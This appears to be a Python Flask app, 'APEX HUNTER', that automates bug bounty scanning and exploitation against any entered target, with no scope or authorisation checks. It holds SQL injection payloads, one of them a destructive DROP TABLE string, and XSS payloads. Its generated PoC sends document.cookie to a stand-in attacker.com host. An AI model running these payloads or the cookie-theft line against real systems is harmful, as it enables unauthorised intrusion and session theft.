#!/usr/bin/env python3
"""
APEX HUNTER - Complete AI-Powered Bug Bounty System
Web interface with AI decision-making for all target types
"""

import os
import sys
import json
import time
import asyncio
import subprocess
import threading
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template_string, request, jsonify, send_file
import requests
import re
from urllib.parse import urlparse
import base64
import hashlib

app = Flask(__name__)

class ApexHunterAI:
    def __init__(self):
        self.setup_dir = Path.home() / "apex_hunter_complete"
        self.setup_dir.mkdir(exist_ok=True)
        
        # Create subdirectories
        for subdir in ['reports', 'evidence', 'logs', 'temp', 'wordlists', 'exploits']:
            (self.setup_dir / subdir).mkdir(exist_ok=True)
        
        self.current_hunt = None
        self.hunt_results = {}
        self.hunt_status = "idle"
        
    def detect_target_type(self, target):
        """AI-powered target type detection"""
        target = target.strip()
        
        # Smart contract detection
        if target.startswith('0x') and len(target) == 42:
            return 'ethereum_contract'
        if target.endswith('.sol') or 'pragma solidity' in target:
            return 'solidity_code'
        
        # APK file detection
        if target.endswith('.apk') or target.startswith('com.') or target.startswith('org.'):
            return 'android_apk'
        
        # GitHub repository detection
        if 'github.com' in target or target.endswith('.git'):
            return 'github_repo'
        
        # IP address detection
        if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
            return 'ip_address'
        
        # Domain detection
        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
            return 'domain'
        
        # URL detection
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            if '/admin' in target.lower() or '/dashboard' in target.lower():
                return 'admin_panel'
            elif '/api/' in target or target.endswith('/api'):
                return 'api_endpoint'
            else:
                return 'web_application'
        
        # Code detection
        if any(keyword in target for keyword in ['function', 'class', 'import', 'def', 'var', 'const']):
            return 'source_code'
        
        return 'unknown'
    
    def create_hunt_strategy(self, target, target_type):
        """AI creates hunting strategy based on target type"""
        strategies = {
            'domain': {
                'phases': ['subdomain_discovery', 'port_scanning', 'web_analysis', 'vulnerability_scanning', 'exploitation'],
                'tools': ['subfinder', 'httpx', 'nmap', 'nuclei', 'ffuf'],
                'time_estimate': '15-30 minutes',
                'expected_findings': ['subdomains', 'open_ports', 'web_technologies', 'vulnerabilities']
            },
            'web_application': {
                'phases': ['reconnaissance', 'directory_enumeration', 'parameter_discovery', 'vulnerability_testing', 'exploitation'],
                'tools': ['httpx', 'ffuf', 'nuclei', 'sqlmap', 'xsstrike'],
                'time_estimate': '20-40 minutes',
                'expected_findings': ['directories', 'parameters', 'xss', 'sql_injection', 'file_inclusion']
            },
            'api_endpoint': {
                'phases': ['endpoint_discovery', 'authentication_testing', 'parameter_fuzzing', 'injection_testing', 'authorization_bypass'],
                'tools': ['httpx', 'ffuf', 'nuclei', 'sqlmap', 'jwt_tool'],
                'time_estimate': '25-45 minutes',
                'expected_findings': ['api_endpoints', 'auth_bypass', 'injection_flaws', 'broken_authorization']
            },
            'admin_panel': {
                'phases': ['authentication_bypass', 'credential_testing', 'privilege_escalation', 'data_extraction'],
                'tools': ['hydra', 'ffuf', 'nuclei', 'sqlmap'],
                'time_estimate': '30-60 minutes',
                'expected_findings': ['weak_credentials', 'auth_bypass', 'privilege_escalation', 'sensitive_data']
            },
            'github_repo': {
                'phases': ['code_analysis', 'secret_scanning', 'dependency_analysis', 'vulnerability_detection'],
                'tools': ['git', 'truffleHog', 'semgrep', 'nuclei'],
                'time_estimate': '20-40 minutes',
                'expected_findings': ['hardcoded_secrets', 'vulnerable_dependencies', 'code_vulnerabilities']
            },
            'android_apk': {
                'phases': ['static_analysis', 'dynamic_analysis', 'network_analysis', 'reverse_engineering'],
                'tools': ['apktool', 'jadx', 'frida', 'objection'],
                'time_estimate': '45-90 minutes',
                'expected_findings': ['hardcoded_secrets', 'insecure_storage', 'network_vulnerabilities', 'logic_flaws']
            },
            'ethereum_contract': {
                'phases': ['contract_analysis', 'vulnerability_scanning', 'exploit_development', 'impact_assessment'],
                'tools': ['slither', 'mythril', 'echidna', 'manticore'],
                'time_estimate': '30-60 minutes',
                'expected_findings': ['reentrancy', 'integer_overflow', 'access_control', 'logic_bugs']
            },
            'ip_address': {
                'phases': ['port_scanning', 'service_enumeration', 'vulnerability_scanning', 'exploitation'],
                'tools': ['nmap', 'masscan', 'nuclei', 'metasploit'],
                'time_estimate': '20-40 minutes',
                'expected_findings': ['open_ports', 'running_services', 'service_vulnerabilities', 'misconfigurations']
            }
        }
        
        return strategies.get(target_type, strategies['domain'])
    
    async def execute_hunt(self, target, target_type):
        """Execute comprehensive hunt based on AI strategy"""
        self.hunt_status = "running"
        self.current_hunt = {
            'target': target,
            'target_type': target_type,
            'start_time': datetime.now(),
            'findings': [],
            'evidence': [],
            'status': 'running'
        }
        
        strategy = self.create_hunt_strategy(target, target_type)
        
        try:
            # Execute hunt phases
            for phase in strategy['phases']:
                await self.execute_phase(phase, target, target_type)
                
            # Generate exploit chains
            chains = await self.discover_exploit_chains()
            
            # Generate professional report
            report = await self.generate_professional_report(target, target_type, chains)
            
            self.current_hunt['status'] = 'completed'
            self.current_hunt['report'] = report
            
        except Exception as e:
            self.current_hunt['status'] = 'error'
            self.current_hunt['error'] = str(e)
        
        self.hunt_status = "completed"
        return self.current_hunt
    
    async def execute_phase(self, phase, target, target_type):
        """Execute specific hunt phase"""
        phase_results = []
        
        if phase == 'subdomain_discovery':
            phase_results = await self.subdomain_discovery(target)
        elif phase == 'port_scanning':
            phase_results = await self.port_scanning(target)
        elif phase == 'web_analysis':
            phase_results = await self.web_analysis(target)
        elif phase == 'vulnerability_scanning':
            phase_results = await self.vulnerability_scanning(target)
        elif phase == 'directory_enumeration':
            phase_results = await self.directory_enumeration(target)
        elif phase == 'parameter_discovery':
            phase_results = await self.parameter_discovery(target)
        elif phase == 'vulnerability_testing':
            phase_results = await self.vulnerability_testing(target)
        elif phase == 'exploitation':
            phase_results = await self.exploitation_phase(target)
        elif phase == 'code_analysis':
            phase_results = await self.code_analysis(target)
        elif phase == 'static_analysis':
            phase_results = await self.static_analysis(target)
        
        self.current_hunt['findings'].extend(phase_results)
        return phase_results
    
    async def subdomain_discovery(self, target):
        """Comprehensive subdomain discovery"""
        findings = []
        
        # Use subfinder
        try:
            result = subprocess.run(['subfinder', '-d', target, '-silent'], 
                                  capture_output=True, text=True, timeout=120)
            if result.returncode == 0:
                subdomains = result.stdout.strip().split('\n')
                for subdomain in subdomains:
                    if subdomain.strip():
                        findings.append({
                            'type': 'subdomain',
                            'value': subdomain.strip(),
                            'severity': 'info',
                            'tool': 'subfinder'
                        })
        except Exception as e:
            pass
        
        return findings
    
    async def port_scanning(self, target):
        """Comprehensive port scanning"""
        findings = []
        
        try:
            # Quick scan of common ports
            result = subprocess.run(['nmap', '-T4', '-F', target], 
                                  capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if '/tcp' in line and 'open' in line:
                        port_info = line.strip()
                        findings.append({
                            'type': 'open_port',
                            'value': port_info,
                            'severity': 'medium',
                            'tool': 'nmap'
                        })
        except Exception as e:
            pass
        
        return findings
    
    async def web_analysis(self, target):
        """Web application analysis"""
        findings = []
        
        try:
            # HTTP probing
            result = subprocess.run(['httpx', '-u', target, '-title', '-tech-detect', '-status-code'], 
                                  capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                findings.append({
                    'type': 'web_info',
                    'value': result.stdout.strip(),
                    'severity': 'info',
                    'tool': 'httpx'
                })
        except Exception as e:
            pass
        
        return findings
    
    async def vulnerability_scanning(self, target):
        """Comprehensive vulnerability scanning"""
        findings = []
        
        try:
            # Use nuclei for vulnerability scanning
            result = subprocess.run(['nuclei', '-u', target, '-silent'], 
                                  capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if line.strip():
                        # Parse nuclei output
                        if '[' in line and ']' in line:
                            findings.append({
                                'type': 'vulnerability',
                                'value': line.strip(),
                                'severity': self.extract_severity(line),
                                'tool': 'nuclei'
                            })
        except Exception as e:
            pass
        
        return findings
    
    async def directory_enumeration(self, target):
        """Directory and file enumeration"""
        findings = []
        
        try:
            wordlist_path = self.setup_dir / 'wordlists' / 'directories' / 'common.txt'
            if wordlist_path.exists():
                result = subprocess.run(['ffuf', '-u', f'{target}/FUZZ', '-w', str(wordlist_path), 
                                       '-mc', '200,301,302,403', '-s'], 
                                      capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if line.strip():
                            findings.append({
                                'type': 'directory',
                                'value': line.strip(),
                                'severity': 'low',
                                'tool': 'ffuf'
                            })
        except Exception as e:
            pass
        
        return findings
    
    async def parameter_discovery(self, target):
        """Parameter discovery and testing"""
        findings = []
        
        # Parameter fuzzing logic here
        common_params = ['id', 'user', 'admin', 'debug', 'test', 'file', 'page', 'url']
        
        for param in common_params:
            try:
                test_url = f"{target}?{param}=test"
                response = requests.get(test_url, timeout=10)
                if response.status_code != 404:
                    findings.append({
                        'type': 'parameter',
                        'value': f'{param} parameter found',
                        'severity': 'low',
                        'tool': 'custom'
                    })
            except Exception:
                pass
        
        return findings
    
    async def vulnerability_testing(self, target):
        """Specific vulnerability testing"""
        findings = []
        
        # SQL Injection testing
        sql_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
        
        for payload in sql_payloads:
            try:
                test_url = f"{target}?id={payload}"
                response = requests.get(test_url, timeout=10)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'error', 'syntax']):
                    findings.append({
                        'type': 'sql_injection',
                        'value': f'Potential SQL injection with payload: {payload}',
                        'severity': 'high',
                        'tool': 'custom',
                        'evidence': response.text[:500]
                    })
            except Exception:
                pass
        
        # XSS testing
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        
        for payload in xss_payloads:
            try:
                test_url = f"{target}?q={payload}"
                response = requests.get(test_url, timeout=10)
                if payload in response.text:
                    findings.append({
                        'type': 'xss',
                        'value': f'Potential XSS with payload: {payload}',
                        'severity': 'medium',
                        'tool': 'custom',
                        'evidence': response.text[:500]
                    })
            except Exception:
                pass
        
        return findings
    
    async def exploitation_phase(self, target):
        """Exploitation and proof of concept generation"""
        findings = []
        
        # Generate exploits based on found vulnerabilities
        for finding in self.current_hunt['findings']:
            if finding['type'] in ['sql_injection', 'xss', 'vulnerability']:
                exploit = await self.generate_exploit(finding, target)
                if exploit:
                    findings.append(exploit)
        
        return findings
    
    async def code_analysis(self, target):
        """Source code analysis"""
        findings = []
        
        if 'github.com' in target:
            # Clone and analyze repository
            try:
                repo_name = target.split('/')[-1].replace('.git', '')
                clone_path = self.setup_dir / 'temp' / repo_name
                
                result = subprocess.run(['git', 'clone', target, str(clone_path)], 
                                      capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    # Search for secrets
                    secret_patterns = [
                        r'api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]+',
                        r'password["\s]*[:=]["\s]*[a-zA-Z0-9]+',
                        r'secret["\s]*[:=]["\s]*[a-zA-Z0-9]+',
                        r'token["\s]*[:=]["\s]*[a-zA-Z0-9]+'
                    ]
                    
                    for root, dirs, files in os.walk(clone_path):
                        for file in files:
                            if file.endswith(('.py', '.js', '.php', '.java', '.go')):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        for pattern in secret_patterns:
                                            matches = re.findall(pattern, content, re.IGNORECASE)
                                            for match in matches:
                                                findings.append({
                                                    'type': 'hardcoded_secret',
                                                    'value': f'Potential secret in {file}: {match}',
                                                    'severity': 'high',
                                                    'tool': 'custom'
                                                })
                                except Exception:
                                    pass
            except Exception as e:
                pass
        
        return findings
    
    async def static_analysis(self, target):
        """Static analysis for APK files"""
        findings = []
        
        # APK analysis logic would go here
        # This would involve using apktool, jadx, etc.
        
        return findings
    
    async def discover_exploit_chains(self):
        """Discover and create exploit chains"""
        chains = []
        
        # Analyze findings for chain opportunities
        findings_by_type = {}
        for finding in self.current_hunt['findings']:
            finding_type = finding['type']
            if finding_type not in findings_by_type:
                findings_by_type[finding_type] = []
            findings_by_type[finding_type].append(finding)
        
        # Look for chain opportunities
        if 'sql_injection' in findings_by_type and 'directory' in findings_by_type:
            chains.append({
                'name': 'SQL Injection + Directory Traversal Chain',
                'description': 'Combine SQL injection with directory access for data extraction',
                'severity': 'critical',
                'bounty_estimate': '$2,000-$8,000',
                'steps': [
                    'Exploit SQL injection to extract database credentials',
                    'Use directory traversal to access configuration files',
                    'Combine information for complete system compromise'
                ]
            })
        
        if 'xss' in findings_by_type and 'parameter' in findings_by_type:
            chains.append({
                'name': 'XSS + Parameter Manipulation Chain',
                'description': 'Use XSS to steal session tokens and manipulate parameters',
                'severity': 'high',
                'bounty_estimate': '$1,000-$4,000',
                'steps': [
                    'Exploit XSS to steal user session cookies',
                    'Use stolen session to access authenticated endpoints',
                    'Manipulate parameters for privilege escalation'
                ]
            })
        
        return chains
    
    async def generate_exploit(self, finding, target):
        """Generate proof of concept exploit"""
        if finding['type'] == 'sql_injection':
            return {
                'type': 'exploit',
                'value': f'SQL Injection PoC for {target}',
                'severity': 'critical',
                'tool': 'custom',
                'poc': f"""
# SQL Injection Proof of Concept
# Target: {target}
# Payload: {finding.get('value', 'Unknown')}

import requests

url = "{target}"
payload = "' OR '1'='1 UNION SELECT username,password FROM users--"
response = requests.get(url + "?id=" + payload)

if "error" in response.text.lower():
    print("SQL Injection confirmed!")
    print("Response:", response.text[:200])
"""
            }
        
        elif finding['type'] == 'xss':
            return {
                'type': 'exploit',
                'value': f'XSS PoC for {target}',
                'severity': 'high',
                'tool': 'custom',
                'poc': f"""
# XSS Proof of Concept
# Target: {target}
# Payload: {finding.get('value', 'Unknown')}

<script>
// XSS Payload
alert('XSS Vulnerability Confirmed');
// Steal cookies
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
"""
            }
        
        return None
    
    async def generate_professional_report(self, target, target_type, chains):
        """Generate comprehensive professional report"""
        report = {
            'executive_summary': {
                'target': target,
                'target_type': target_type,
                'scan_date': datetime.now().isoformat(),
                'total_findings': len(self.current_hunt['findings']),
                'critical_findings': len([f for f in self.current_hunt['findings'] if f.get('severity') == 'critical']),
                'high_findings': len([f for f in self.current_hunt['findings'] if f.get('severity') == 'high']),
                'medium_findings': len([f for f in self.current_hunt['findings'] if f.get('severity') == 'medium']),
                'low_findings': len([f for f in self.current_hunt['findings'] if f.get('severity') == 'low']),
                'exploit_chains': len(chains),
                'estimated_bounty': self.calculate_bounty_estimate(self.current_hunt['findings'], chains)
            },
            'methodology': {
                'approach': 'Comprehensive automated security assessment',
                'tools_used': list(set([f.get('tool', 'unknown') for f in self.current_hunt['findings']])),
                'phases_executed': ['reconnaissance', 'vulnerability_discovery', 'exploitation', 'chain_analysis']
            },
            'detailed_findings': self.current_hunt['findings'],
            'exploit_chains': chains,
            'recommendations': self.generate_recommendations(self.current_hunt['findings']),
            'appendix': {
                'tools_versions': await self.get_tool_versions(),
                'scan_duration': str(datetime.now() - self.current_hunt['start_time']),
                'evidence_files': []
            }
        }
        
        # Save report
        report_file = self.setup_dir / 'reports' / f'report_{target}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report
    
    def extract_severity(self, line):
        """Extract severity from tool output"""
        if 'critical' in line.lower():
            return 'critical'
        elif 'high' in line.lower():
            return 'high'
        elif 'medium' in line.lower():
            return 'medium'
        elif 'low' in line.lower():
            return 'low'
        else:
            return 'info'
    
    def calculate_bounty_estimate(self, findings, chains):
        """Calculate estimated bounty based on findings"""
        base_bounty = 0
        
        for finding in findings:
            severity = finding.get('severity', 'info')
            if severity == 'critical':
                base_bounty += 2000
            elif severity == 'high':
                base_bounty += 1000
            elif severity == 'medium':
                base_bounty += 500
            elif severity == 'low':
                base_bounty += 100
        
        # Chain bonus
        for chain in chains:
            if chain.get('severity') == 'critical':
                base_bounty += 3000
            elif chain.get('severity') == 'high':
                base_bounty += 1500
        
        return f"${base_bounty:,}"
    
    def generate_recommendations(self, findings):
        """Generate security recommendations"""
        recommendations = []
        
        finding_types = [f.get('type') for f in findings]
        
        if 'sql_injection' in finding_types:
            recommendations.append({
                'issue': 'SQL Injection',
                'recommendation': 'Implement parameterized queries and input validation',
                'priority': 'Critical'
            })
        
        if 'xss' in finding_types:
            recommendations.append({
                'issue': 'Cross-Site Scripting (XSS)',
                'recommendation': 'Implement proper output encoding and Content Security Policy',
                'priority': 'High'
            })
        
        if 'directory' in finding_types:
            recommendations.append({
                'issue': 'Directory Traversal',
                'recommendation': 'Implement proper access controls and path validation',
                'priority': 'Medium'
            })
        
        return recommendations
    
    async def get_tool_versions(self):
        """Get versions of all tools used"""
        versions = {}
        
        tools = ['nmap', 'nuclei', 'subfinder', 'httpx', 'ffuf']
        
        for tool in tools:
            try:
                result = subprocess.run([tool, '--version'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    versions[tool] = result.stdout.strip().split('\n')[0]
            except Exception:
                versions[tool] = 'Unknown'
        
        return versions

# Global AI instance
ai = ApexHunterAI()

# Web Interface HTML Template
WEB_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APEX HUNTER - AI Bug Bounty System</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { 
            text-align: center; 
            margin-bottom: 30px; 
            border: 2px solid #00ff41;
            padding: 20px;
            border-radius: 10px;
            background: rgba(0, 255, 65, 0.1);
        }
        .header h1 { 
            font-size: 2.5em; 
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff41;
        }
        .header p { 
            font-size: 1.2em; 
            opacity: 0.8;
        }
        .input-section {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ff41;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            color: #00ff41;
        }
        .input-group textarea, .input-group input {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 1px solid #00ff41;
            border-radius: 5px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .input-group textarea {
            height: 120px;
            resize: vertical;
        }
        .target-types {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .target-type {
            background: rgba(0, 255, 65, 0.1);
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .target-type:hover {
            background: rgba(0, 255, 65, 0.2);
            transform: translateY(-2px);
        }
        .target-type.selected {
            background: rgba(0, 255, 65, 0.3);
            border-color: #fff;
        }
        .hunt-button {
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
            padding: 20px 40px;
            font-size: 1.2em;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: all 0.3s;
        }
        .hunt-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4);
        }
        .hunt-button:disabled {
            background: #666;
            cursor: not-allowed;
        }
        .results-section {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff41;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            display: none;
        }
        .status-bar {
            background: #000;
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .findings {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.5);
        }
        .finding {
            background: rgba(0, 255, 65, 0.1);
            border-left: 4px solid #00ff41;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 0 5px 5px 0;
        }
        .finding.critical { border-left-color: #ff0000; }
        .finding.high { border-left-color: #ff6600; }
        .finding.medium { border-left-color: #ffff00; }
        .finding.low { border-left-color: #00ff41; }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #000;
            border: 1px solid #00ff41;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            width: 0%;
            transition: width 0.3s;
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div class="container">
        <div class="header">
            <h1>🎯 APEX HUNTER</h1>
            <p>AI-Powered Elite Bug Bounty Automation System</p>
            <p>🧠 Intelligent • ⚡ Automated • 🎯 Professional</p>
        </div>
        
        <div class="input-section">
            <h2>🎯 Target Input</h2>
            <p>Enter any target: Domain, URL, IP, GitHub repo, APK, Smart Contract, or Source Code</p>
            
            <div class="input-group">
                <label for="target">Target (AI will auto-detect type):</label>
                <textarea id="target" placeholder="Examples:
• Domain: example.com
• URL: https://example.com/admin
• API: https://api.example.com/v1
• GitHub: https://github.com/user/repo
• Smart Contract: 0x742d35Cc6634C0532925a3b8D404fAbCe4649681
• APK: com.example.app
• IP Address: 192.168.1.1
• Source Code: Paste your code here..."></textarea>
            </div>
            
            <div class="target-types">
                <div class="target-type" data-type="auto">
                    <h3>🤖 Auto-Detect</h3>
                    <p>AI decides strategy</p>
                </div>
                <div class="target-type" data-type="domain">
                    <h3>🌐 Domain</h3>
                    <p>Full domain analysis</p>
                </div>
                <div class="target-type" data-type="web_app">
                    <h3>🕸️ Web App</h3>
                    <p>Web application testing</p>
                </div>
                <div class="target-type" data-type="api">
                    <h3>🔌 API</h3>
                    <p>API security testing</p>
                </div>
                <div class="target-type" data-type="mobile">
                    <h3>📱 Mobile</h3>
                    <p>APK analysis</p>
                </div>
                <div class="target-type" data-type="blockchain">
                    <h3>⛓️ Blockchain</h3>
                    <p>Smart contract audit</p>
                </div>
                <div class="target-type" data-type="code">
                    <h3>💻 Source Code</h3>
                    <p>Code analysis</p>
                </div>
                <div class="target-type" data-type="infrastructure">
                    <h3>🏗️ Infrastructure</h3>
                    <p>Network & server testing</p>
                </div>
            </div>
            
            <button class="hunt-button" onclick="startHunt()">
                🚀 START AI HUNT
            </button>
        </div>
        
        <div class="results-section" id="results">
            <h2>🔍 Hunt Results</h2>
            <div class="status-bar" id="status">
                Ready to hunt...
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>
            <div class="findings" id="findings">
                <p>No findings yet. Start a hunt to see results!</p>
            </div>
        </div>
    </div>
    
    <script>
        // Matrix background effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
        const matrixArray = matrix.split("");
        
        const fontSize = 10;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let x = 0; x < columns; x++) {
            drops[x] = 1;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px arial';
            
            for(let i = 0; i < drops.length; i++) {
                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        
        // Target type selection
        document.querySelectorAll('.target-type').forEach(type => {
            type.addEventListener('click', function() {
                document.querySelectorAll('.target-type').forEach(t => t.classList.remove('selected'));
                this.classList.add('selected');
            });
        });
        
        // Auto-select auto-detect by default
        document.querySelector('[data-type="auto"]').classList.add('selected');
        
        let huntInProgress = false;
        
        async function startHunt() {
            if (huntInProgress) return;
            
            const target = document.getElementById('target').value.trim();
            if (!target) {
                alert('Please enter a target!');
                return;
            }
            
            huntInProgress = true;
            document.querySelector('.hunt-button').disabled = true;
            document.querySelector('.hunt-button').textContent = '🔍 HUNTING IN PROGRESS...';
            document.getElementById('results').style.display = 'block';
            
            // Start hunt
            try {
                const response = await fetch('/start_hunt', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        target: target,
                        hunt_type: document.querySelector('.target-type.selected').dataset.type
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Start polling for results
                    pollResults();
                } else {
                    alert('Failed to start hunt: ' + result.error);
                    resetHuntButton();
                }
            } catch (error) {
                alert('Error starting hunt: ' + error.message);
                resetHuntButton();
            }
        }
        
        async function pollResults() {
            try {
                const response = await fetch('/hunt_status');
                const data = await response.json();
                
                updateStatus(data);
                
                if (data.status === 'completed' || data.status === 'error') {
                    resetHuntButton();
                } else {
                    setTimeout(pollResults, 2000); // Poll every 2 seconds
                }
            } catch (error) {
                console.error('Error polling results:', error);
                setTimeout(pollResults, 5000); // Retry in 5 seconds
            }
        }
        
        function updateStatus(data) {
            const statusEl = document.getElementById('status');
            const progressEl = document.getElementById('progress');
            const findingsEl = document.getElementById('findings');
            
            // Update status
            statusEl.textContent = `Status: ${data.status} | Findings: ${data.findings_count || 0}`;
            
            // Update progress
            const progress = data.progress || 0;
            progressEl.style.width = progress + '%';
            
            // Update findings
            if (data.findings && data.findings.length > 0) {
                findingsEl.innerHTML = '';
                data.findings.forEach(finding => {
                    const findingEl = document.createElement('div');
                    findingEl.className = `finding ${finding.severity || 'info'}`;
                    findingEl.innerHTML = `
                        <strong>${finding.type || 'Unknown'}</strong>: ${finding.value || 'No description'}
                        <br><small>Tool: ${finding.tool || 'Unknown'} | Severity: ${finding.severity || 'Info'}</small>
                    `;
                    findingsEl.appendChild(findingEl);
                });
            }
        }
        
        function resetHuntButton() {
            huntInProgress = false;
            document.querySelector('.hunt-button').disabled = false;
            document.querySelector('.hunt-button').textContent = '🚀 START AI HUNT';
        }
        
        // Resize canvas on window resize
        window.addEventListener('resize', function() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(WEB_TEMPLATE)

@app.route('/start_hunt', methods=['POST'])
def start_hunt():
    try:
        data = request.json
        target = data.get('target', '').strip()
        hunt_type = data.get('hunt_type', 'auto')
        
        if not target:
            return jsonify({'success': False, 'error': 'No target provided'})
        
        # Detect target type if auto
        if hunt_type == 'auto':
            target_type = ai.detect_target_type(target)
        else:
            target_type = hunt_type
        
        # Start hunt in background thread
        def run_hunt():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(ai.execute_hunt(target, target_type))
        
        hunt_thread = threading.Thread(target=run_hunt)
        hunt_thread.daemon = True
        hunt_thread.start()
        
        return jsonify({
            'success': True, 
            'target_type': target_type,
            'message': f'Hunt started for {target} (detected as {target_type})'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/hunt_status')
def hunt_status():
    try:
        if ai.current_hunt is None:
            return jsonify({
                'status': 'idle',
                'findings_count': 0,
                'findings': [],
                'progress': 0
            })
        
        # Calculate progress based on findings
        findings_count = len(ai.current_hunt.get('findings', []))
        progress = min(findings_count * 10, 100)  # Rough progress estimation
        
        return jsonify({
            'status': ai.current_hunt.get('status', 'unknown'),
            'findings_count': findings_count,
            'findings': ai.current_hunt.get('findings', []),
            'progress': progress,
            'target': ai.current_hunt.get('target', ''),
            'target_type': ai.current_hunt.get('target_type', ''),
            'start_time': ai.current_hunt.get('start_time', datetime.now()).isoformat() if ai.current_hunt.get('start_time') else None
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/download_report')
def download_report():
    try:
        if ai.current_hunt and ai.current_hunt.get('report'):
            # Generate report file
            report_data = json.dumps(ai.current_hunt['report'], indent=2)
            report_file = ai.setup_dir / 'reports' / f"report_{ai.current_hunt['target']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(report_file, 'w') as f:
                f.write(report_data)
            
            return send_file(str(report_file), as_attachment=True)
        else:
            return jsonify({'error': 'No report available'})
            
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    print("🎯 APEX HUNTER - Complete AI System Starting...")
    print("🌐 Web interface will be available at: http://localhost:8080")
    print("🧠 AI-powered target detection and hunting enabled")
    print("🚀 Ready for elite bug bounty hunting!")
    
    app.run(host='0.0.0.0', port=8080, debug=False)